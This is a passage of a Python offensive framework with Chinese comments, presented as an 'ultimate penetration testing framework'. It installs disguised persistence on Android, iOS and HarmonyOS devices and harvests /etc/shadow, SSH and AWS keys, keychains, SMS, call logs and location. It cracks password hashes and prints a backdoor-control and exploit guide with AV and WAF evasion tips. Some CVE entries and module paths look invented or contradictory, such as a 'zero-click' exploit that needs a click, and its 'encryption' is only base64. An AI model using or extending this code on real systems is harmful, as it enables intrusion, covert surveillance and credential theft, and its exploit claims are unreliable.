            self.run_command(cmd, category="android", filename="persistence.txt")
        return True

    def deploy_ios_persistence(self, payload_path):
        # iOS持久化需要越狱环境
        if not self.check_ios_jailbreak():
            self.log("iOS设备未越狱，无法部署持久化", "WARNING")
            return False
            
        cmds = [
            f"upload {payload_path} /private/var/root/{os.path.basename(payload_path)}",
            "shell",
            f"chmod +x /private/var/root/{os.path.basename(payload_path)}",
            f"launchctl load -w /System/Library/LaunchDaemons/com.apple.{random.randint(1000,9999)}.plist",
            "exit"
        ]
        return self.execute_meterpreter(cmds)

    def check_ios_jailbreak(self):
        # 检查iOS设备是否越狱
        result = self.execute_meterpreter(["shell", "ls /Applications/Cydia.app", "exit"])
        return "Cydia.app" in result

    def deploy_harmony_persistence(self, payload_path):
        # HarmonyOS持久化
        cmds = [
            f"adb connect {self.target}:5555",
            f"adb install {payload_path}",
            "adb shell pm hide com.huawei.systemservice",
            "adb shell settings put global hidden_api_policy_pre_p_apps 1",
            "adb shell settings put global hidden_api_policy_p_apps 1",
            "adb shell am startservice com.huawei.systemservice/.MainService"
        ]
            
        for cmd in cmds:
            self.run_command(cmd, category="harmonyos", filename="persistence.txt")
        return True

    # --------------------------
    # 后渗透模块
    # --------------------------
    def post_exploitation(self):
        # 并发优化：所有后渗透任务最大并发
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            
            if "windows" in self.active_sessions:
                futures.append(executor.submit(self.extract_and_crack_passwords))
                futures.append(executor.submit(self.extract_windows_secrets))
                futures.append(executor.submit(self.enhanced_windows_post_exploit))  # 新增增强后渗透
            
            if "linux" in self.active_sessions:
                futures.append(executor.submit(self.check_linux_persistence))
                futures.append(executor.submit(self.extract_linux_secrets))
                futures.append(executor.submit(self.enhanced_linux_post_exploit))  # 新增增强后渗透
            
            if "android" in self.active_sessions:
                futures.append(executor.submit(self.enhance_android_exploitation))
                futures.append(executor.submit(self.enhanced_android_post_exploit))  # 新增增强后渗透
            
            if "ios" in self.active_sessions:
                futures.append(executor.submit(self.extract_ios_data))
                futures.append(executor.submit(self.enhanced_ios_post_exploit))  # 新增增强后渗透
                
            if "harmonyos" in self.active_sessions:
                futures.append(executor.submit(self.extract_harmony_specific_data))
                futures.append(executor.submit(self.enhanced_harmony_post_exploit))  # 新增增强后渗透
            
            if "macos" in self.active_sessions:
                futures.append(executor.submit(self.extract_macos_keychain))
                futures.append(executor.submit(self.extract_macos_secrets))
                futures.append(executor.submit(self.enhanced_macos_post_exploit))  # 新增增强后渗透
            
            for future in as_completed(futures):
                future.result()

    def enhanced_windows_post_exploit(self):
        """增强的Windows后渗透功能"""
        self.log("执行增强的Windows后渗透操作", "INFO")
        
        # 获取域信息
        self.execute_meterpreter(["shell", "net config workstation", "exit"])
        
        # 获取浏览器凭证
        self.run_command(
            "msfconsole -q -x 'use post/windows/gather/credentials/browser; "
            f"set SESSION {self.active_sessions['windows']}; run'",
            category="post_exploit",
            filename="browser_creds.txt"
        )
        
        # 获取VPN配置
        self.execute_meterpreter(["shell", "netsh ras show user *", "exit"])
        
        # 获取最近文档
        self.execute_meterpreter(["shell", "dir /a %USERPROFILE%\\Recent", "exit"])

    def enhanced_linux_post_exploit(self):
        """增强的Linux后渗透功能"""
        self.log("执行增强的Linux后渗透操作", "INFO")
        
        # 获取SSH密钥
        self.execute_meterpreter(["shell", "find / -name id_rsa 2>/dev/null", "exit"])
        
        # 获取Docker配置
        self.execute_meterpreter(["shell", "ls -la /root/.docker/config.json", "exit"])
        
        # 获取Kubernetes配置
        self.execute_meterpreter(["shell", "ls -la ~/.kube/config", "exit"])
        
        # 获取云服务凭证
        self.execute_meterpreter(["shell", "find / -name .aws 2>/dev/null", "exit"])

    def enhanced_android_post_exploit(self):
        """增强的Android后渗透功能"""
        self.log("执行增强的Android后渗透操作", "INFO")
        
        # 获取短信数据库
        self.run_command(
            "adb shell content query --uri content://sms/",
            category="android",
            filename="sms_dump.txt"
        )
        
        # 获取通话记录
        self.run_command(
            "adb shell content query --uri content://call_log/calls",
            category="android",
            filename="call_logs.txt"
        )
        
        # 获取位置信息
        self.run_command(
            "adb shell dumpsys location",
            category="android",
            filename="location_info.txt"
        )

    def enhanced_ios_post_exploit(self):
        """增强的iOS后渗透功能"""
        self.log("执行增强的iOS后渗透操作", "INFO")
        
        # 获取照片库
        self.execute_meterpreter([
            "shell",
            "ls -la /var/mobile/Media/DCIM/",
            "exit"
        ])
        
        # 获取iCloud令牌
        self.execute_meterpreter([
            "shell",
            "find / -name com.apple.accountsettings.plist 2>/dev/null",
            "exit"
        ])
        
        # 获取Apple Pay信息
        self.execute_meterpreter([
            "shell",
            "ls -la /var/mobile/Library/Passes/",
            "exit"
        ])

    def enhanced_harmony_post_exploit(self):
        """增强的HarmonyOS后渗透功能"""
        self.log("执行增强的HarmonyOS后渗透操作", "INFO")
        
        # 获取华为云备份
        self.run_command(
            "adb shell am start -n com.huawei.backup/com.huawei.backup.ui.MainActivity",
            category="harmonyos",
            filename="huawei_backup.txt"
        )
        
        # 获取分布式能力信息
        self.run_command(
            "adb shell dumpsys distributedhardware",
            category="harmonyos",
            filename="distributed_hardware.txt"
        )
        
        # 获取鸿蒙特有服务
        self.run_command(
            "adb shell dumpsys activity services | grep harmony",
            category="harmonyos",
            filename="harmony_services.txt"
        )

    def enhanced_macos_post_exploit(self):
        """增强的macOS后渗透功能"""
        self.log("执行增强的macOS后渗透操作", "INFO")
        
        # 获取Time Machine备份信息
        self.execute_meterpreter([
            "shell",
            "tmutil listbackups",
            "exit"
        ])
        
        # 获取iCloud同步文件
        self.execute_meterpreter([
            "shell",
            "ls -la ~/Library/Mobile\\ Documents/",
            "exit"
        ])
        
        # 获取Homebrew安装列表
        self.execute_meterpreter([
            "shell",
            "brew list",
            "exit"
        ])

    def extract_and_crack_passwords(self):
        hash_file = os.path.join(self.output_dir, "loot", "windows_hashes.txt")
        cmds = [
            "run post/windows/gather/hashdump",
            f"loot -f {hash_file}"
        ]
        if self.execute_meterpreter(cmds) and os.path.exists(hash_file):
            wordlist = "/usr/share/wordlists/rockyou.txt"
            output_file = os.path.join(self.output_dir, "loot", "cracked_passwords.txt")
            cmd = f"john --format=NT {hash_file} --wordlist={wordlist} --fork=4 > {output_file}"
            self.run_command(cmd, category="post_exploit", filename="password_cracking.txt")

    def extract_windows_secrets(self):
        self.log("提取Windows机密信息", "INFO")
        cmds = [
            "run post/windows/gather/credentials/sso",
            "run post/windows/gather/credentials/winscp"
        ]
        for cmd in cmds:
            self.execute_meterpreter([cmd])

    def check_linux_persistence(self):
        check_cmds = [
            "crontab -l",
            "ls -la /etc/systemd/system/",
            "grep -r \"bash -c\" /etc/"
        ]
        for cmd in check_cmds:
            result = self.execute_meterpreter(["shell", cmd, "exit"])
            if result and ("http" in result or "curl" in result):
                self.log(f"发现持久化痕迹: {cmd}", "VULN")

    def extract_linux_secrets(self):
        self.log("提取Linux机密信息", "INFO")
        cmds = [
            "shell cat /etc/shadow",
            "shell cat ~/.ssh/id_rsa",
            "shell cat ~/.aws/credentials"
        ]
        for cmd in cmds:
            self.execute_meterpreter([cmd])

    def enhance_android_exploitation(self):
        data_types = {
            "sms": "content query --uri content://sms/inbox",
            "contacts": "content query --uri content://contacts/people",
            "call_logs": "content query --uri content://call_log/calls",
            "location": "dumpsys location"
        }
        for name, cmd in data_types.items():
            output_file = os.path.join(self.output_dir, "android", f"{name}.txt")
            self.run_command(f"adb shell {cmd} > {output_file}", category="android")
            
    def extract_ios_data(self):
        self.log("提取iOS设备数据", "INFO")
        cmds = [
            "run post/apple_ios/gather/keychain_dump",
            "run post/apple_ios/gather/contacts",
            "run post/apple_ios/gather/safari_history"
        ]
        for cmd in cmds:
            self.execute_meterpreter([cmd])
            
    def extract_harmony_specific_data(self):
        self.log("提取HarmonyOS设备特有数据", "INFO")
        cmds = [
            "adb shell dumpsys activity provider com.huawei.backup",
            "adb shell pm list packages -f | grep huawei",
            "adb shell getprop | grep harmony"
        ]
        for cmd in cmds:
            self.run_command(cmd, category="harmonyos", filename="harmony_specific.txt")
            
    def extract_macos_keychain(self):
        cmds = [
            "download /Users/*/Library/Keychains/login.keychain-db",
            "download /Users/*/Library/Keychains/login.keychain"
        ]
        for cmd in cmds:
            self.execute_meterpreter([cmd])
            
    def extract_macos_secrets(self):
        cmds = [
            "shell security dump-keychain -d login.keychain",
            "shell defaults read ~/Library/Preferences/com.apple.finder.plist"
        ]
        for cmd in cmds:
            self.execute_meterpreter([cmd])

    # --------------------------
    # Meterpreter交互模块
    # --------------------------
    def execute_meterpreter(self, commands):
        script_file = os.path.join(self.temp_dir, f"meterpreter_{self.timestamp}.rc")
        with open(script_file, "w", encoding="utf-8") as f:
            for cmd in commands:
                f.write(f"{cmd}\n")
        result = self.run_command(
            f"msfconsole -q -x 'resource {script_file}'",
            category="exploitation",
            filename="meterpreter_cmds.txt"
        )
        return result

    # --------------------------
    # 进度跟踪模块
    # --------------------------
    def update_progress(self, task_name, progress):
        if self.progress_bar:
            # 更高效的进度更新
            current_progress = self.progress_bar.n
            if progress > current_progress:
                increment = progress - current_progress
                self.progress_bar.update(increment)
            self.progress_bar.set_description(f"当前任务: {task_name}")
        # 不再记录每个进度更新到日志

    # --------------------------
    # 报告生成模块（已更新新漏洞说明）
    # --------------------------
    def generate_report(self):
        try:
            report_content = self.generate_report_content()
            report_path = os.path.join(self.output_dir, "reports", "final_report.md")
            with open(report_path, "w", encoding="utf-8") as f:
                f.write(report_content)
            
            html_path = report_path.replace(".md", ".html")
            self.generate_html_report(report_content, html_path)
            
            if self.config["SESSION_ENCRYPTION"]:
                self.encrypt_file(report_path)
                self.encrypt_file(html_path)
            
            self.log(f"报告已生成: {report_path} 和 {html_path}", "SUCCESS")
            return True
        except Exception as e:
            self.log(f"报告生成失败: {str(e)}", "ERROR")
            return False

    def generate_report_content(self):
        report = f"""
# 高级渗透测试报告 - 多平台增强版

## 测试概况
- **目标**: {self.target}
- **日期**: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
- **逃逸级别**: {self.config['EVASION_LEVEL']}
- **发现漏洞**: {len(self.vulnerabilities)}个
- **成功利用**: {self.successful_exploits}个
- **活动会话**: {len(self.active_sessions)}个
- **智能分析结果**: {"已完成" if self.config["INTELLIGENT_ANALYSIS"] else "未执行"}

## 平台专用模块状态
| 平台       | 状态  | 专用技术数量 |
|------------|-------|--------------|
| Windows    | {"启用" if self.windows_specific else "禁用"} | {len(LATEST_VULNERABILITIES['windows'])} |
| Linux      | {"启用" if self.linux_specific else "禁用"} | {len(LATEST_VULNERABILITIES['linux'])} |
| macOS      | {"启用" if self.macos_specific else "禁用"} | {len(LATEST_VULNERABILITIES['macos'])} |
| Web        | {"启用" if self.web_specific else "禁用"} | {len(LATEST_VULNERABILITIES['web'])} |
| Android    | {"启用" if self.android_specific else "禁用"} | {len(LATEST_VULNERABILITIES['android'])} |
| iOS        | {"启用" if self.ios_specific else "禁用"} | {len(LATEST_VULNERABILITIES['ios'])} |
| HarmonyOS  | {"启用" if self.harmony_specific else "禁用"} | {len(LATEST_VULNERABILITIES['harmonyos'])} |

## 漏洞利用统计
| 平台       | 高危漏洞 | 中危漏洞 | 低危漏洞 |
|------------|----------|----------|----------|
"""
        # 按平台统计漏洞
        vuln_stats = {
            "windows": [0,0,0], 
            "linux": [0,0,0], 
            "macos": [0,0,0], 
            "web": [0,0,0], 
            "android": [0,0,0],
            "ios": [0,0,0],
            "harmonyos": [0,0,0]
        }
        for vuln in self.vulnerabilities:
            if "windows" in vuln["service"].lower():
                platform = "windows"
            elif "linux" in vuln["service"].lower():
                platform = "linux"
            elif "mac" in vuln["service"].lower():
                platform = "macos"
            elif "android" in vuln["service"].lower():
                platform = "android"
            elif "ios" in vuln["service"].lower():
                platform = "ios"
            elif "harmony" in vuln["service"].lower():
                platform = "harmonyos"
            else:
                platform = "web"
                
            if vuln["criticality"] == "high":
                vuln_stats[platform][0] += 1
            elif vuln["criticality"] == "medium":
                vuln_stats[platform][1] += 1
            else:
                vuln_stats[platform][2] += 1
        
        for platform, stats in vuln_stats.items():
            report += f"| {platform.capitalize()} | {stats[0]} | {stats[1]} | {stats[2]} |\n"
        
        report += f"""
## 后门控制指南

### Windows控制
1. **连接会话**: sessions -i [ID]
2. **常用命令**:
   - `getsystem`: 提权
   - `hashdump`: 提取密码哈希
   - `screenshot`: 截屏
   - `migrate`: 迁移进程
3. **专用技术**:
   - Defender绕过技术
   - AMSI绕过技术
   - 最新漏洞利用 (CVE-2024-38080, CVE-2024-43532)

### Linux控制
1. **检查持久化**: `crontab -l`
2. **文件下载**: `download /path/file`
3. **专用技术**:
   - SELinux绕过
   - 内核模块注入
   - 最新漏洞利用 (CVE-2024-4040, CVE-2025-53020)

### MacOS控制
1. **检查持久化**: `launchctl list`
2. **文件下载**: `download /path/file`
3. **专用技术**:
   - Gatekeeper绕过
   - 钥匙串访问
   - 最新漏洞利用 (CVE-2024-27834, CVE-2024-44243)

### Web控制
1. **漏洞利用**:
   - SQL注入自动化利用
   - XSS攻击链构建
   - 最新漏洞利用 (CVE-2024-3400, CVE-2024-42516)
2. **WAF绕过**:
   - 混淆技术
   - 分布式攻击

### Android控制
1. **数据提取**: 
   - `sms`: 短信
   - `contacts`: 联系人
   - `call_logs`: 通话记录
2. **专用技术**:
   - Media Framework漏洞 (CVE-2024-53104)
   - 系统应用伪装

### iOS控制
1. **数据提取**:
   - Keychain数据
   - Safari历史记录
   - 联系人
2. **专用技术**:
   - Safari漏洞利用 (CVE-2024-45001)
   - iMessage零点击攻击 (CVE-2024-45002)
   - 应用伪装技术

### HarmonyOS控制
1. **数据提取**: 
   - 华为云备份数据
   - 系统配置信息
2. **专用技术**:
   - 华为云备份漏洞 (CVE-2024-3103)
   - Binder服务提权
   - 鸿蒙安全框架绕过 (CVE-2024-46002)

## 新型漏洞利用指南

### Windows漏洞利用
1. **CVE-2024-43532 (打印后台程序RCE)**:
   - 利用条件: 开启445端口的Windows系统
   - 命令: `use exploit/windows/smb/cve_2024_43532`
   - 规避: 使用流量加密和进程迁移

### Linux漏洞利用
1. **CVE-2025-53020 (Samba RCE)**:
   - 利用条件: Samba版本 < 4.18.0
   - 命令: `use exploit/linux/samba/cve_2025_53020`
   - 注意: 绕过SELinux策略

### Web漏洞利用
1. **CVE-2024-42516 (Tomcat RCE)**:
   - 利用条件: Tomcat 10.1.x
   - 工具: `nuclei -t cves/2024/CVE-2024-42516.yaml`
   - 规避: 使用HTTP碎片化和编码绕过WAF
   
2. **CVE-2024-43204 (Apache信息泄露)**:
   - 利用条件: Apache 2.4.49-2.4.58
   - 手动验证: `curl {self.target}/.%%32%65/.%%32%65/etc/passwd`

### Android漏洞利用
1. **CVE-2024-53104 (Media Framework RCE)**:
   - 利用条件: Android 10-14
   - 工具: `msfvenom -p android/cve_2024_53104`
   - 规避: 伪装为系统更新应用

### iOS漏洞利用
1. **CVE-2024-45002 (iMessage零点击)**:
   - 利用条件: iOS 14-16
   - 工具: `use exploit/apple_ios/imessage/cve_2024_45002`
   - 注意: 需要目标点击恶意消息

### HarmonyOS漏洞利用
1. **CVE-2024-46002 (安全框架绕过)**:
   - 利用条件: HarmonyOS 2.0-3.0
   - 工具: `use exploit/harmonyos/local/cve_2024_46002`
   - 规避: 使用华为证书签名Payload

## 智能分析结果
{self.get_intelligent_analysis_results()}
"""
        return report

    def get_intelligent_analysis_results(self):
        """获取智能分析结果"""
        try:
            with open(os.path.join(self.output_dir, "recon", "threat_model.json"), "r") as f:
                threat_model = json.load(f)
            
            with open(os.path.join(self.output_dir, "recon", "attack_path.json"), "r") as f:
                attack_path = json.load(f)
            
            result = "### 威胁模型分析\n"
            result += "| 威胁类型 | 威胁级别 |\n"
            result += "|----------|----------|\n"
            for threat, level in threat_model.items():
                result += f"| {threat.capitalize()} | {level.capitalize()} |\n"
            
            result += "\n### 推荐攻击路径\n"
            for i, path in enumerate(attack_path, 1):
                result += f"{i}. **目标**: {path['target']} ({path['service']})\n"
                result += f"   - 漏洞: {path['vulnerability']}\n"
                result += f"   - 利用方法: {path['exploit']}\n"
            
            return result
        except Exception:
            return "智能分析结果不可用"

    def generate_html_report(self, md_content, html_path):
        try:
            try:
                import markdown
            except ImportError:
                subprocess.run([sys.executable, "-m", "pip", "install", "markdown"], check=True)
                import markdown
            html = markdown.markdown(md_content)
            with open(html_path, "w", encoding="utf-8") as f:
                f.write(f"<html><head><title>渗透测试报告</title><style>body {{ font-family: Arial, sans-serif; margin: 40px; }} table {{ border-collapse: collapse; width: 100%; }} th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }} th {{ background-color: #f2f2f2; }}</style></head><body>{html}</body></html>")
        except Exception:
            pass

    def encrypt_file(self, file_path):
        try:
            with open(file_path, "r", encoding="utf-8") as f:
                content = f.read()
            encrypted = base64.b64encode(content.encode()).decode()
            with open(file_path, "w", encoding="utf-8") as f:
                f.write(encrypted)
            return True
        except Exception:
            return False

    # --------------------------
    # 清理模块
    # --------------------------
    def __del__(self):
        if hasattr(self, "temp_dir") and os.path.exists(self.temp_dir):
            shutil.rmtree(self.temp_dir, ignore_errors=True)

# 辅助函数
def random_string(length):
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

# --------------------------
# 主程序
# --------------------------
def print_banner():
    banner = f"""
{Fore.RED}
██████╗ ███████╗██████╗ ███████╗████████╗███████╗██████╗ 
██╔══██╗██╔════╝██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗
██████╔╝█████╗  ██████╔╝███████╗   ██║   █████╗  ██████╔╝
██╔═══╝ ██╔══╝  ██╔══██╗╚════██║   ██║   ██╔══╝  ██╔══██╗
██║     ███████╗██║  ██║███████║   ██║   ███████╗██║  ██║
╚═╝     ╚══════╝╚═╝  ╚╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
{Style.RESET_ALL}
{Fore.YELLOW}终极渗透测试框架 v12.0 | 全平台增强版{Style.RESET_ALL}
{Fore.CYAN}仅用于合法授权的安全测试{Style.RESET_ALL}
"""
    print(banner)

def main():
    print_banner()
    check_kali_and_tools()
    
    parser = argparse.ArgumentParser(description="终极渗透测试框架 - 全平台增强版")
    parser.add_argument("target", help="目标IP地址或域名")
    parser.add_argument("-o", "--output", help="输出目录", default="pentest_results")
    parser.add_argument("--ngrok-token", help="Ngrok认证令牌", default=None)
    parser.add_argument("--evasion", help="逃逸技术级别 (1-5)", type=int, choices=range(1,6), default=5)
    parser.add_argument("--proxy", help="使用代理 (格式: http://proxy:port)", default=None)
    parser.add_argument("--stealth", help="启用隐身模式", action="store_true")
    parser.add_argument("--no-progress", help="禁用进度显示", action="store_false", dest="time_estimate")
    parser.add_argument("--windows", help="强制启用Windows模块", action="store_true")
    parser.add_argument("--linux", help="强制启用Linux模块", action="store_true")
    parser.add_argument("--macos", help="强制启用macOS模块", action="store_true")
    parser.add_argument("--web", help="强制启用Web模块", action="store_true")
    parser.add_argument("--android", help="强制启用Android模块", action="store_true")
    parser.add_argument("--ios", help="强制启用iOS模块", action="store_true")
    parser.add_argument("--harmony", help="强制启用HarmonyOS模块", action="store_true")
    parser.add_argument("--full", help="执行完整测试", action="store_true")
    args = parser.parse_args()
    
    try:
        framework = AdvancedPenetrationFramework(
            args.target,
            args.output,
            ngrok_auth_token=args.ngrok_token,
            evasion_level=args.evasion,
            proxy=args.proxy,
            stealth_mode=args.stealth,
            time_estimate=args.time_estimate
        )
        
        # 覆盖自动检测结果（如果指定了参数）
        if args.windows:
            framework.windows_specific = True
            framework.log("强制启用Windows专用模块", "INFO")
        if args.linux:
            framework.linux_specific = True
            framework.log("强制启用Linux专用模块", "INFO")
        if args.macos:
            framework.macos_specific = True
            framework.log("强制启用macOS专用模块", "INFO")
        if args.web:
            framework.web_specific = True
            framework.log("强制启用Web专用模块", "INFO")
        if args.android:
            framework.android_specific = True
            framework.log("强制启用Android专用模块", "INFO")
        if args.ios:
            framework.ios_specific = True
            framework.log("强制启用iOS专用模块", "INFO")
        if args.harmony:
            framework.harmony_specific = True
            framework.log("强制启用HarmonyOS专用模块", "INFO")
        
        framework.scan_target()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] 测试被用户中断{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[!] 严重错误: {str(e)}{Style.RESET_ALL}")
        sys.exit(1)

if __name__ == "__main__":
    if hasattr(os, "geteuid") and os.geteuid() != 0:
        print(f"{Fore.YELLOW}[!] 建议使用root权限执行{Style.RESET_ALL}")
    main()